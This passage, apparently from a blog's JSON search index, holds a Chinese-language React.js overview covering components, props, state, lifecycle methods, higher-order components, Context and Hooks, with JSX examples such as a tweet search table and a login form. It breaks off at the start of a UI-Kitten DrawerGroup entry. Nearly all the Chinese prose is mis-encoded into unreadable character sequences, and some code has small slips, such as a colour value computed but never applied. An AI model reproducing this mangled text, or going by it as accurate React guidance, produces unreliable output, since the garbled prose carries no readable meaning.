className=\u0026#34;Tweet\u0026#34;\u0026gt;\r\u0026lt;div className=\u0026#34;User\u0026#34;\u0026gt;\r\u0026lt;Avatar user={props.author} /\u0026gt;\r\u0026lt;div className=\u0026#34;User-name\u0026#34;\u0026gt;\r{props.author.name}\r\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;div className=\u0026#34;Tweet-text\u0026#34;\u0026gt;\r{props.text}\r\u0026lt;/div\u0026gt;\r\u0026lt;img className=\u0026#34;Tweet-image\u0026#34;\rsrc={props.image.imageUrl}\ralt={props.image.description}\r/\u0026gt;\r\u0026lt;div className=\u0026#34;Tweet-date\u0026#34;\u0026gt;\r{formatDate(props.date)}\r\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r} æ¥ä¸‹æ¥æˆ‘ä»¬è¦åšçš„æ˜¯ä¸€ä¸ª User ç»„ä»¶ï¼Œå®ƒåœ¨ç”¨æˆ·åçš„æ—è¾¹å‘ˆç°ä¸€ä¸ª_å¤´åƒ_ï¼š\nfunction User(props) {\rreturn (\r\u0026lt;div className=\u0026#34;User\u0026#34;\u0026gt;\r\u0026lt;Avatar user={props.user} /\u0026gt;\r\u0026lt;div className=\u0026#34;User-name\u0026#34;\u0026gt;\r{props.user.name}\r\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r} ç°åœ¨æˆ‘ä»¬å°†è¿›ä¸€æ­¥ç®€åŒ– Tweetï¼š\nfunction Tweet(props) {\rreturn (\r\u0026lt;div className=\u0026#34;Tweet\u0026#34;\u0026gt;\r\u0026lt;User user={props.author} /\u0026gt;\r\u0026lt;div className=\u0026#34;Tweet-text\u0026#34;\u0026gt;\r{props.text}\r\u0026lt;/div\u0026gt;\r\u0026lt;img className=\u0026#34;Tweet-image\u0026#34;\rsrc={props.image.imageUrl}\ralt={props.image.description}\r/\u0026gt;\r\u0026lt;div className=\u0026#34;Tweet-date\u0026#34;\u0026gt;\r{formatDate(props.date)}\r\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r} æå–ç»„ä»¶ä¼¼ä¹æ˜¯ä¸€é¡¹ä¹å‘³çš„å·¥ä½œï¼Œä½†æ˜¯åœ¨ä¸ºå¤§å‹åº”ç”¨ç¨‹åºç¼–ç æ—¶ï¼Œæ‹¥æœ‰å¯é‡ç”¨çš„ç»„ä»¶ä¼šä½¿äº‹æƒ…å˜å¾—æ›´å®¹æ˜“ã€‚ ç®€åŒ–ç»„ä»¶æ—¶è¦è€ƒè™‘çš„ä¸€ä¸ªå¾ˆå¥½çš„æ ‡å‡†æ˜¯ï¼š\nå¦‚æœ UI çš„ä¸€éƒ¨åˆ†è¢«å¤šæ¬¡ä½¿ç”¨ï¼ˆæŒ‰é’®ã€é¢æ¿ã€å¤´åƒï¼‰ï¼Œæˆ–è€…å®ƒæœ¬èº«è¶³å¤Ÿå¤æ‚ï¼ˆåº”ç”¨ç¨‹åºã€FeedStoryã€è¯„è®ºï¼‰ï¼Œé‚£ä¹ˆå®ƒæ˜¯ä¸€ä¸ªå¾ˆå¥½çš„å€™é€‰è€… è¢«æå–åˆ°ä¸€ä¸ªå•ç‹¬çš„ç»„ä»¶ã€‚\n2. Props Props æ˜¯å±æ€§çš„ç¼©å†™å½¢å¼ï¼Œå®ƒä»¬åªæ˜¯æŒ‡ React ä¸­ç»„ä»¶çš„å†…éƒ¨æ•°æ®ã€‚ å®ƒä»¬å†™åœ¨ç»„ä»¶è°ƒç”¨ä¸­å¹¶ä¼ é€’åˆ°ç»„ä»¶ä¸­ã€‚ å®ƒä»¬è¿˜ä½¿ç”¨ä¸ HTML å±æ€§ç›¸åŒçš„è¯­æ³•ï¼Œä¾‹å¦‚ _ prop=\u0026ldquo;value\u0026rdquo;ã€‚\nå…³äºé“å…·å€¼å¾—è®°ä½çš„ä¸¤ä»¶äº‹:\n é¦–å…ˆï¼Œåœ¨æ„å»ºç»„ä»¶ä¹‹å‰ç¡®å®š prop çš„å€¼å¹¶å°†å…¶ç”¨ä½œè“å›¾çš„ä¸€éƒ¨åˆ†ã€‚ å…¶æ¬¡ï¼Œprop çš„å€¼æ°¸è¿œä¸ä¼šæ”¹å˜ï¼Œå³ props ä¸€æ—¦è¢«ä¼ é€’åˆ°ç»„ä»¶ä¸­å°±æ˜¯åªè¯»çš„ã€‚  è®¿é—® prop çš„æ–¹å¼æ˜¯é€šè¿‡æ¯ä¸ªç»„ä»¶éƒ½å¯ä»¥è®¿é—®çš„â€œthis.propsâ€å±æ€§æ¥å¼•ç”¨å®ƒã€‚\n3. State State æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œå®ƒåŒ…å«ä¸€äº›å¯èƒ½åœ¨ç»„ä»¶çš„ç”Ÿå‘½å‘¨æœŸå†…å‘ç”Ÿå˜åŒ–çš„ä¿¡æ¯ã€‚\nè¿™æ„å‘³ç€å®ƒåªæ˜¯å­˜å‚¨åœ¨ç»„ä»¶ Props ä¸­çš„æ•°æ®çš„å½“å‰å¿«ç…§ã€‚\næ•°æ®ä¼šéšç€æ—¶é—´çš„æ¨ç§»è€Œå˜åŒ–ï¼Œå› æ­¤ç®¡ç†æ•°æ®å˜åŒ–æ–¹å¼çš„æŠ€æœ¯å˜å¾—å¿…è¦ï¼Œä»¥ç¡®ä¿ç»„ä»¶åœ¨æ°å½“çš„æ—¶é—´çœ‹èµ·æ¥åƒå·¥ç¨‹å¸ˆå¸Œæœ›çš„é‚£æ ·â€”â€”è¿™ç§°ä¸ºçŠ¶æ€ç®¡ç†ã€‚\nå‡ ä¹ä¸å¯èƒ½åœ¨ä¸äº†è§£çŠ¶æ€ç®¡ç†çš„æƒ…å†µä¸‹é˜…è¯»ä¸€æ®µå…³äº React çš„å†…å®¹ã€‚\nå¼€å‘äººå‘˜å–œæ¬¢é˜è¿°è¿™ä¸ªä¸»é¢˜ï¼Œä½†åœ¨å…¶æ ¸å¿ƒï¼ŒçŠ¶æ€ç®¡ç†å¹¶ä¸åƒå¬èµ·æ¥é‚£ä¹ˆå¤æ‚ã€‚\nåœ¨ React ä¸­ï¼Œè¿˜å¯ä»¥å…¨å±€è·Ÿè¸ªçŠ¶æ€ï¼Œå¹¶ä¸”å¯ä»¥æ ¹æ®éœ€è¦åœ¨ç»„ä»¶ä¹‹é—´å…±äº«æ•°æ®ã€‚\næœ¬è´¨ä¸Šï¼Œè¿™æ„å‘³ç€åœ¨ React åº”ç”¨ç¨‹åºä¸­ï¼Œåœ¨æ–°ä½ç½®åŠ è½½æ•°æ®å¹¶ä¸åƒä½¿ç”¨å…¶ä»–æŠ€æœ¯é‚£æ ·æ˜‚è´µã€‚ React åº”ç”¨ç¨‹åºåœ¨ä¿å­˜å’ŒåŠ è½½å“ªäº›æ•°æ®ä»¥åŠä½•æ—¶åŠ è½½æ–¹é¢æ›´åŠ æ™ºèƒ½ã€‚è¿™ä¸ºåˆ¶ä½œä»¥æ–°æ–¹å¼ä½¿ç”¨æ•°æ®çš„ç•Œé¢æä¾›äº†æœºä¼šã€‚\næƒ³æƒ³ React ç»„ä»¶ï¼Œæ¯”å¦‚å…·æœ‰è‡ªå·±çš„æ•°æ®ã€é€»è¾‘å’Œè¡¨ç¤ºçš„å¾®åº”ç”¨ç¨‹åºã€‚\næ¯ä¸ªç»„ä»¶éƒ½åº”è¯¥æœ‰ä¸€ä¸ªå•ä¸€çš„ç›®çš„ã€‚ä½œä¸ºä¸€åå·¥ç¨‹å¸ˆï¼Œæ‚¨å¯ä»¥å†³å®šè¯¥ç›®çš„å¹¶å®Œå…¨æ§åˆ¶æ¯ä¸ªç»„ä»¶çš„è¡Œä¸ºæ–¹å¼å’Œä½¿ç”¨çš„æ•°æ®ã€‚\næ‚¨ä¸å†å—é¡µé¢å…¶ä½™éƒ¨åˆ†æ•°æ®çš„é™åˆ¶ã€‚åœ¨æ‚¨çš„è®¾è®¡ä¸­ï¼Œæ‚¨å¯ä»¥é€šè¿‡å„ç§æ–¹å¼åˆ©ç”¨è¿™ä¸€ç‚¹ã€‚æœ‰æœºä¼šå±•ç¤ºå¯ä»¥æ”¹å–„ç”¨æˆ·ä½“éªŒæˆ–ä½¿è®¾è®¡ä¸­çš„åŒºåŸŸæ›´å…·ä¸Šä¸‹æ–‡çš„é™„åŠ æ•°æ®ã€‚\nå¦‚ä½•åœ¨ React ä¸­æ·»åŠ  State\nåœ¨è®¾è®¡æ—¶ï¼ŒåŒ…æ‹¬ State æ˜¯æ‚¨åº”è¯¥æ”¾åˆ°ä»»åŠ¡çš„æœ€åã€‚ ä½¿ç”¨ props å’Œ events å°†æ‰€æœ‰ä¸œè¥¿è®¾è®¡å¾—å°½å¯èƒ½æ— çŠ¶æ€è¦å¥½å¾—å¤šã€‚ è¿™ä½¿å¾—ç»„ä»¶æ›´æ˜“äºç»´æŠ¤ã€æµ‹è¯•å’Œç†è§£ã€‚\næ·»åŠ çŠ¶æ€åº”è¯¥é€šè¿‡ Redux å’Œ MobX ç­‰çŠ¶æ€å®¹å™¨æˆ–å®¹å™¨/åŒ…è£…å™¨ç»„ä»¶æ¥å®Œæˆã€‚\nRedux æ˜¯å…¶ä»–ååº”å¼æ¡†æ¶çš„æµè¡ŒçŠ¶æ€ç®¡ç†ç³»ç»Ÿã€‚ å®ƒå®ç°äº†ä¸€ä¸ªç”±åŠ¨ä½œé©±åŠ¨çš„é›†ä¸­çŠ¶æ€æœºã€‚\nåœ¨ä¸‹é¢çš„ç¤ºä¾‹ä¸­ï¼ŒçŠ¶æ€çš„ä½ç½®å¯ä»¥æ˜¯ LoginContainer æœ¬èº«ã€‚ è®©æˆ‘ä»¬ä¸ºæ­¤ä½¿ç”¨ React Hooksï¼ˆè¿™å°†åœ¨ä¸‹ä¸€èŠ‚ä¸­è®¨è®ºï¼‰ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35  const LoginContainer = () =\u0026gt; { const [username, setUsername] = useState(\u0026#34;\u0026#34;); const [password, setPassword] = useState(\u0026#34;\u0026#34;); const login = async event =\u0026gt; { event.preventDefault(); const response = await fetch(\u0026#34;/api\u0026#34;, { method: \u0026#34;POST\u0026#34;, body: JSON.stringify({ username, password, }), }); // åœ¨è¿™é‡Œæˆ‘ä»¬å¯ä»¥æ£€æŸ¥ response.status ç™»å½•æˆ–æ˜¾ç¤ºé”™è¯¯  }; return ( \u0026lt;LoginForm onSubmit={login}\u0026gt; \u0026lt;FormInput name=\u0026#34;username\u0026#34; title=\u0026#34;Username\u0026#34; onChange={event =\u0026gt; setUsername(event.currentTarget.value)} value={username} /\u0026gt; \u0026lt;FormPasswordInput name=\u0026#34;password\u0026#34; title=\u0026#34;Password\u0026#34; onChange={event =\u0026gt; setPassword(event.currentTarget.value)} value={password} /\u0026gt; \u0026lt;SubmitButton\u0026gt;Login\u0026lt;/SubmitButton\u0026gt; \u0026lt;/LoginForm\u0026gt; ); };   Props vs State é“å…·å’ŒçŠ¶æ€æœ‰æ—¶ä¼šç›¸äº’æ··æ·†ï¼Œå› ä¸ºå®ƒä»¬éå¸¸ç›¸ä¼¼ã€‚ ä»¥ä¸‹æ˜¯å®ƒä»¬ä¹‹é—´çš„ä¸€äº›ä¸»è¦åŒºåˆ«ï¼š\n   Props State     ç»„ä»¶ä¹‹é—´çš„æ•°æ®ä¿æŒä¸å˜ æ•°æ®æ˜¯å­˜å‚¨åœ¨ç»„ä»¶çš„ Props ä¸­çš„æ•°æ®çš„å½“å‰å¿«ç…§ã€‚ å®ƒåœ¨ç»„ä»¶çš„ç”Ÿå‘½å‘¨æœŸå†…å‘ç”Ÿå˜åŒ–   æ•°æ®æ˜¯åªè¯»çš„ æ•°æ®å¯ä»¥æ˜¯å¼‚æ­¥çš„   propsä¸­çš„æ•°æ®ä¸å¯ä¿®æ”¹ å¯ä»¥ä½¿ç”¨ this.setState ä¿®æ”¹ state ä¸­çš„æ•°æ®   props æ˜¯ä¼ é€’ç»™ç»„ä»¶çš„ä¸œè¥¿ State åœ¨ç»„ä»¶å†…ç®¡ç†    \rReact ä¸­çš„å…¶ä»–æ¦‚å¿µ ç»„ä»¶ã€é“å…·å’ŒçŠ¶æ€æ˜¯ä½ åœ¨ React ä¸­æ‰€åšçš„ä¸€åˆ‡çš„ä¸‰ä¸ªå…³é”®æ¦‚å¿µã€‚ ä½†è¿˜æœ‰å…¶ä»–æ¦‚å¿µéœ€è¦å­¦ä¹ ï¼š\n1. ç”Ÿå‘½å‘¨æœŸ æ¯ä¸ªReactç»„ä»¶éƒ½ç»è¿‡ä¸‰ä¸ªé˜¶æ®µï¼šå®‰è£…ã€æ¸²æŸ“å’Œæ‹†å¸ã€‚ åœ¨è¿™ä¸‰ä¸ªé˜¶æ®µå‘ç”Ÿçš„ä¸€ç³»åˆ—äº‹ä»¶å¯ä»¥ç§°ä¸ºç»„ä»¶çš„ç”Ÿå‘½å‘¨æœŸã€‚\nè™½ç„¶è¿™äº›äº‹ä»¶éƒ¨åˆ†ä¸ç»„ä»¶çš„çŠ¶æ€ï¼ˆå…¶å†…éƒ¨æ•°æ®ï¼‰ç›¸å…³ï¼Œä½†ç”Ÿå‘½å‘¨æœŸç•¥æœ‰ä¸åŒã€‚ React å…·æœ‰æ ¹æ®éœ€è¦åŠ è½½å’Œå¸è½½ç»„ä»¶çš„å†…éƒ¨ä»£ç ï¼Œå¹¶ä¸”ç»„ä»¶å¯ä»¥å­˜åœ¨äºè¯¥å†…éƒ¨ä»£ç ä¸­çš„å¤šä¸ªä½¿ç”¨é˜¶æ®µã€‚\nç”Ÿå‘½å‘¨æœŸæ–¹æ³•æœ‰å¾ˆå¤šï¼Œä½†æœ€å¸¸è§çš„æ˜¯ï¼š\n render() - è¿™ä¸ªæ–¹æ³•æ˜¯ React ä¸­ç±»ç»„ä»¶ä¸­å”¯ä¸€éœ€è¦çš„æ–¹æ³•ï¼Œä¹Ÿæ˜¯æœ€å¸¸ç”¨çš„æ–¹æ³•ã€‚ é¡¾åæ€ä¹‰ï¼Œå®ƒè´Ÿè´£å¤„ç†ç»„ä»¶åˆ° UI çš„æ¸²æŸ“ï¼Œå®ƒå‘ç”Ÿåœ¨ç»„ä»¶çš„å®‰è£…å’Œæ¸²æŸ“è¿‡ç¨‹ä¸­ã€‚  åˆ›å»ºæˆ–åˆ é™¤ç»„ä»¶æ—¶ï¼š\n  componentDidMount() åœ¨ç»„ä»¶è¾“å‡ºæ¸²æŸ“åˆ° DOM åè¿è¡Œ\n  åœ¨å¸è½½å’Œé”€æ¯ç»„ä»¶ä¹‹å‰ç«‹å³è°ƒç”¨ componentWillUnmount()\n  å½“ props æˆ– state æ›´æ–°æ—¶ï¼š\n  å½“æ¥æ”¶åˆ°æ–°çš„ props æˆ– state æ—¶ï¼Œ shouldComponentUpdate() åœ¨æ¸²æŸ“ä¹‹å‰è¢«è°ƒç”¨ã€‚\n  componentDidUpdate() åœ¨æ›´æ–°å‘ç”Ÿåç«‹å³è°ƒç”¨ã€‚ åˆå§‹æ¸²æŸ“ä¸ä¼šè°ƒç”¨æ­¤æ–¹æ³•ã€‚\n  2. HOC é«˜é˜¶ç»„ä»¶ Higher-order component (HOC) æ˜¯ React ä¸­ç”¨äºé‡ç”¨ç»„ä»¶é€»è¾‘çš„é«˜çº§æŠ€æœ¯ã€‚\næ„æ€æ˜¯é«˜é˜¶ç»„ä»¶æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œå®ƒæ¥å—ä¸€ä¸ªç»„ä»¶å¹¶è¿”å›ä¸€ä¸ªæ–°ç»„ä»¶ã€‚\nå®ƒä»¬æ˜¯ä» React çš„ç»„åˆæ€§è´¨ä¸­å‡ºç°çš„æ¨¡å¼ã€‚ ç»„ä»¶å°† props è½¬æ¢ä¸º UIï¼Œè€Œé«˜é˜¶ç»„ä»¶å°†ä¸€ä¸ªç»„ä»¶è½¬æ¢ä¸ºå¦ä¸€ä¸ªç»„ä»¶ï¼Œå®ƒä»¬å¾€å¾€åœ¨ç¬¬ä¸‰æ–¹åº“ä¸­æµè¡Œã€‚\n3. Context åœ¨å…¸å‹çš„ React åº”ç”¨ç¨‹åºä¸­ï¼Œæ•°æ®é€šè¿‡ props ä¼ é€’ï¼Œä½†è¿™å¯¹äºåº”ç”¨ç¨‹åºä¸­çš„è®¸å¤šç»„ä»¶æ‰€éœ€çš„æŸäº›ç±»å‹çš„ props æ¥è¯´å¯èƒ½å¾ˆéº»çƒ¦ã€‚\nContext æä¾›äº†ä¸€ç§åœ¨ç»„ä»¶ä¹‹é—´å…±äº«è¿™äº›ç±»å‹çš„æ•°æ®çš„æ–¹æ³•ï¼Œè€Œæ— éœ€æ˜¾å¼åœ°é€šè¿‡æ¯ä¸ªå±‚æ¬¡ç»“æ„çº§åˆ«ä¼ é€’ propã€‚\næ„æ€æ˜¯ä¸Šä¸‹æ–‡ï¼Œæˆ‘ä»¬å¯ä»¥é¿å…é€šè¿‡ä¸­é—´å…ƒç´ ä¼ é€’é“å…·ã€‚\n\rReact Hooks Hooks æ˜¯è®©ä½ ä»åŠŸèƒ½ç»„ä»¶â€œé’©å…¥â€React çŠ¶æ€å’Œç”Ÿå‘½å‘¨æœŸç‰¹æ€§çš„å‡½æ•°ã€‚\nå®ƒä»¬è®©æ‚¨æ— éœ€ç¼–å†™ç±»å³å¯ä½¿ç”¨çŠ¶æ€å’Œå…¶ä»– React åŠŸèƒ½ã€‚\n\råœ¨ React ä¸­æ€è€ƒ âœ” React çœŸæ­£ä»¤äººæƒŠå¥‡çš„ä¸€ä»¶äº‹æ˜¯å®ƒå¦‚ä½•è®©æ‚¨åœ¨æ„å»ºåº”ç”¨ç¨‹åºæ—¶æ€è€ƒå®ƒä»¬ã€‚\nä½¿ç”¨ React Hooks æ„å»ºå¯æœç´¢äº§å“æ•°æ®è¡¨çš„æ€è€ƒè¿‡ç¨‹ã€‚\nç¬¬ 1 æ­¥ï¼šä» æ¨¡æ‹Ÿ å¼€å§‹æƒ³è±¡ä¸€ä¸‹ æœ‰ä¸€ä¸ª JSON API å’Œä¸€ä¸ªæ¨¡æ‹Ÿç•Œé¢ï¼š\nJSON API è¿”å›ä¸€äº›å¦‚ä¸‹æ‰€ç¤ºçš„æ•°æ®ï¼š\n[\r{category: \u0026#34;Entertainment\u0026#34;, retweets: \u0026#34;54\u0026#34;, isLocal: false, text: \u0026#34;Omg. A tweet.\u0026#34;},\r{category: \u0026#34;Entertainment\u0026#34;, retweets: \u0026#34;100\u0026#34;, isLocal: false, text: \u0026#34;Omg. Another.\u0026#34;},\r{category: \u0026#34;Technology\u0026#34;, retweets: \u0026#34;32\u0026#34;, isLocal: false, text: \u0026#34;New ECMAScript features!\u0026#34;},\r{category: \u0026#34;Technology\u0026#34;, retweets: \u0026#34;88\u0026#34;, isLocal: true, text: \u0026#34;Wow, learning React!\u0026#34;}\r]; æç¤ºï¼šåƒ Excalidraw è¿™æ ·çš„å…è´¹å·¥å…·å¯ç”¨äºç»˜åˆ¶ UI å’Œç»„ä»¶çš„é«˜çº§æ¨¡æ‹Ÿã€‚\nç¬¬ 2 æ­¥ï¼šå°† UI åˆ†è§£ä¸ºå±‚æ¬¡ç»“æ„ç»„ä»¶ æœ‰äº†æ¨¡æ‹Ÿåï¼Œæ¥ä¸‹æ¥è¦åšçš„æ˜¯åœ¨æ¨¡æ‹Ÿä¸­çš„æ¯ä¸ªç»„ä»¶ï¼ˆå’Œå­ç»„ä»¶ï¼‰å‘¨å›´ç»˜åˆ¶æ¡†ï¼Œå¹¶å‘½åæ‰€æœ‰è¿™äº›æ¡†ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚\nä½¿ç”¨å•ä¸€èŒè´£åŸåˆ™ï¼šç†æƒ³æƒ…å†µä¸‹ï¼Œç»„ä»¶åº”è¯¥å…·æœ‰å•ä¸€åŠŸèƒ½ã€‚ å¦‚æœå®ƒæœ€ç»ˆå¢é•¿ï¼Œåˆ™åº”å°†å…¶åˆ†è§£ä¸ºæ›´å°çš„å­ç»„ä»¶ã€‚ ä½¿ç”¨ç›¸åŒçš„æŠ€æœ¯æ¥å†³å®šæ˜¯å¦åº”è¯¥åˆ›å»ºæ–°å‡½æ•°æˆ–å¯¹è±¡ã€‚\nä¸Šå›¾ä¸­çœ‹åˆ°åº”ç”¨ç¨‹åºä¸­æœ‰äº”ä¸ªç»„ä»¶ã€‚ å·²ç»åˆ—å‡ºäº†æ¯ä¸ªç»„ä»¶ä»£è¡¨çš„æ•°æ®ã€‚\n TweetSearchResultsï¼ˆæ©™è‰²ï¼‰ï¼šå®Œæ•´ç»„ä»¶çš„å®¹å™¨ SearchBarï¼ˆè“è‰²ï¼‰ï¼šç”¨æˆ·è¾“å…¥è¦æœç´¢çš„å†…å®¹ TweetListï¼ˆç»¿è‰²ï¼‰ï¼šæ ¹æ®ç”¨æˆ·è¾“å…¥æ˜¾ç¤ºå’Œè¿‡æ»¤æ¨æ–‡ TweetCategoryï¼ˆç»¿æ¾çŸ³è‰²ï¼‰ï¼šæ˜¾ç¤ºæ¯ä¸ªç±»åˆ«çš„æ ‡é¢˜ TweetRowï¼ˆçº¢è‰²ï¼‰ï¼šä¸ºæ¯æ¡æ¨æ–‡æ˜¾ç¤ºä¸€è¡Œ  æ—¢ç„¶å·²ç»ç¡®å®šäº†æ¨¡æ‹Ÿä¸­çš„ç»„ä»¶ï¼Œæ¥ä¸‹æ¥è¦åšçš„å°±æ˜¯å°†å®ƒä»¬åˆ†ç±»åˆ°ä¸€ä¸ªå±‚æ¬¡ç»“æ„ä¸­ã€‚\nåœ¨æ¨¡æ‹Ÿä¸­çš„å¦ä¸€ä¸ªç»„ä»¶ä¸­æ‰¾åˆ°çš„ç»„ä»¶åº”æ˜¾ç¤ºä¸ºå±‚æ¬¡ç»“æ„ä¸­çš„å­ç»„ä»¶ã€‚\nåƒè¿™æ ·ï¼š\n\r- TweetSearchResults\r- SearchBar\r- TweetList\r- TweetCategory\r- TweetRow\r\rç¬¬ 3 æ­¥ï¼šå®ç°åº”ç”¨ç¨‹åºã€‚ åœ¨å»å¹´ä¹‹å‰ï¼Œæœ€å¿«çš„æ–¹æ³•æ˜¯æ„å»ºä¸€ä¸ªç‰ˆæœ¬ï¼Œè¯¥ç‰ˆæœ¬æ¥å—æ•°æ®æ¨¡å‹å¹¶å‘ˆç° UI ä½†å…·æœ‰é›¶äº¤äº’æ€§ï¼Œ\nä½†æ˜¯è‡ªä»å¼•å…¥ React Hooks ä»¥æ¥ï¼Œå®ç°åº”ç”¨ç¨‹åºçš„æ›´ç®€å•æ–¹æ³•æ˜¯ä½¿ç”¨ Hooksï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105  // i. TweetSearchResults const TweetSearchResults = ({tweets}) =\u0026gt; { const [filterText, setFilterText] = useState(\u0026#39;\u0026#39;); const [inThisLocation, setInThisLocation] = useState(false); return ( \u0026lt;div\u0026gt; \u0026lt;SearchBar filterText={filterText} inThisLocation={inThisLocation} setFilterText={setFilterText} setInThisLocation={setInThisLocation} /\u0026gt; \u0026lt;TweetList tweets={tweets} filterText={filterText} inThisLocation={inThisLocation} /\u0026gt; \u0026lt;/div\u0026gt; ); } // ii. SearchBar const SearchBar = ({filterText, inThisLocation, setFilterText, setInThisLocation}) =\u0026gt; ( \u0026lt;form\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; placeholder=\u0026#34;Search...\u0026#34; value={filterText} onChange={(e) =\u0026gt; setFilterText(e.target.value)} /\u0026gt; \u0026lt;p\u0026gt; \u0026lt;label\u0026gt; \u0026lt;input type=\u0026#34;checkbox\u0026#34; checked={inThisLocation} onChange={(e) =\u0026gt; setInThisLocation(e.target.checked)} /\u0026gt; {\u0026#39; \u0026#39;} Only show tweets in your current location \u0026lt;/label\u0026gt; \u0026lt;/p\u0026gt; \u0026lt;/form\u0026gt; ); // iii. TweetList const TweetList = ({tweets, filterText, inThisLocation}) =\u0026gt; { const rows = []; let lastCategory = null; tweets.forEach((tweet) =\u0026gt; { if (tweet.text.toLowerCase().indexOf(filterText.toLowerCase()) === -1) { return; } if (inThisLocation \u0026amp;\u0026amp; !tweet.isLocal) { return; } if (tweet.category !== lastCategory) { rows.push( \u0026lt;TweetCategory category={tweet.category} key={tweet.category} /\u0026gt; ); } rows.push( \u0026lt;TweetRow tweet={tweet} key={tweet.text} /\u0026gt; ); lastCategory = tweet.category; }); return ( \u0026lt;table\u0026gt; \u0026lt;thead\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;th\u0026gt;Tweet Text\u0026lt;/th\u0026gt; \u0026lt;th\u0026gt;Retweets\u0026lt;/th\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;/thead\u0026gt; \u0026lt;tbody\u0026gt;{rows}\u0026lt;/tbody\u0026gt; \u0026lt;/table\u0026gt; ); } // iv. TweetCategory const TweetCategory = ({category}) =\u0026gt; ( \u0026lt;tr\u0026gt; \u0026lt;th colSpan=\u0026#34;2\u0026#34;\u0026gt; {category} \u0026lt;/th\u0026gt; \u0026lt;/tr\u0026gt; ); // v. TweetRow const TweetRow = ({tweet}) =\u0026gt; { const color = tweet.isLocal ? \u0026#39;inherit\u0026#39; : \u0026#39;red\u0026#39;; return ( \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt;\u0026lt;span style=\u0026#34;\u0026#34;\u0026gt;{tweet.text}\u0026lt;/span\u0026gt;\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;{tweet.retweets}\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; ); }   æœ€ç»ˆçš„å®ç°å°†æ˜¯æŒ‰ç…§å‰é¢æ‰€è¿°çš„å±‚æ¬¡ç»“æ„ä¸€èµ·ç¼–å†™çš„æ‰€æœ‰ä»£ç ï¼š\n\r- TweetSearchResults\r- SearchBar\r- TweetList\r- TweetCategory\r- TweetRow\r\r\rå¼€å§‹ React çš„æ–¹å¼ æœ‰å¤šç§æ–¹æ³•å¯ä»¥å¼€å§‹ä½¿ç”¨ Reactã€‚\n  ç›´æ¥åœ¨ç½‘é¡µä¸ŠåŠ è½½ï¼šè¿™æ˜¯è®¾ç½® React çš„æœ€ç®€å•æ–¹æ³•ã€‚ å°† React JavaScript æ·»åŠ åˆ°æ‚¨çš„é¡µé¢ï¼Œä½œä¸º npm ä¾èµ–é¡¹æˆ–é€šè¿‡ CDNã€‚\n  ä½¿ç”¨ create-react-appï¼šcreate-react-app æ˜¯ä¸€ä¸ªæ—¨åœ¨å¿«ä½¿ç”¨ React çš„é¡¹ç›®ï¼Œä»»ä½•éœ€è¦è¶…å‡ºå•ä¸ªé¡µé¢çš„ React åº”ç”¨ç¨‹åºéƒ½ä¼šå‘ç° create-react-app éå¸¸ç¬¦åˆè¿™ä¸ªéœ€æ±‚ å®¹æ˜“åœ°ã€‚\n  æ›´ä¸¥è‚ƒçš„ç”Ÿäº§åº”ç”¨ç¨‹åºåº”è¯¥è€ƒè™‘ä½¿ç”¨ Next.jsï¼Œå› ä¸ºå®ƒå…·æœ‰æ›´å¼ºå¤§çš„é»˜è®¤å€¼ï¼ˆå¦‚ä»£ç æ‹†åˆ†ï¼‰ã€‚\n  ä»£ç æ²™ç›’ï¼šæ— éœ€å®‰è£…å³å¯è·å¾— create-react-app ç»“æ„çš„ä¸€ç§ç®€å•æ–¹æ³•æ˜¯è®¿é—® https://codesandbox.io/s å¹¶é€‰æ‹©â€œReactâ€ã€‚\n  Codepenï¼šå¦‚æœå¯¹ React ç»„ä»¶è¿›è¡ŒåŸå‹è®¾è®¡å¹¶å–œæ¬¢ä½¿ç”¨ Codepen é‚£ä¹ˆä¹Ÿå¯ä»¥ã€‚\n  \rç»“è®º React.js åº“æ—¨åœ¨ä½¿æ„å»ºæ¨¡å—åŒ–ã€å¯é‡ç”¨ç”¨æˆ·ç•Œé¢ç»„ä»¶çš„è¿‡ç¨‹å˜å¾—ç®€å•ç›´è§‚ã€‚\nå½“é˜…è¯»ä¸€äº›å…¶ä»–æŒ‡å—æ—¶ï¼Œä¼šå‘ç°è¿™ä¸ªç®€çŸ­çš„ä»‹ç»æ˜¯ä¸€ä¸ªæœ‰ç”¨çš„é«˜çº§æ¦‚è¿°ã€‚\n\rçŸ¥è¯†ç‚¹  React ReactDOM JSX Redux Hooks ReactNative Webpack CRA Next.js  ","description":"ç”¨äºæ„å»ºå¯é‡ç”¨ç”¨æˆ·ç•Œé¢ç»„ä»¶çš„ UI åº“","id":43,"section":"react-patterns","tags":null,"title":"React.js æ¦‚è¿°","uri":"https://codthing.github.io/react-patterns/render-patterns/overview-react/"},{"content":"ä¸€ã€DrawerGroup ï¼ˆUI-Kitten ï¼‰ DrawerGroup å¯¼èˆªé—®é¢˜ xxx è¿™ä¸ªé—®é¢˜æ²¡æœ‰è§£å†³\n UI-Kitten Version@5.0.0\n@ui-kitten/components DrawerGroup\n const DrawerContent = ({ navigation, state }) =\u0026gt; {\rconst routes = [//1.å®šä¹‰å¯¹åº”çš„ç»„ä»¶ï¼ˆç»„ä»¶åè€Œétitleåï¼‰æ•°ç»„\r[\u0026#39;Users\u0026#39;],\r[\u0026#39;Orders\u0026#39;],\r[\u0026#39;EvaDesign\u0026#39;, \u0026#39;News\u0026#39;, 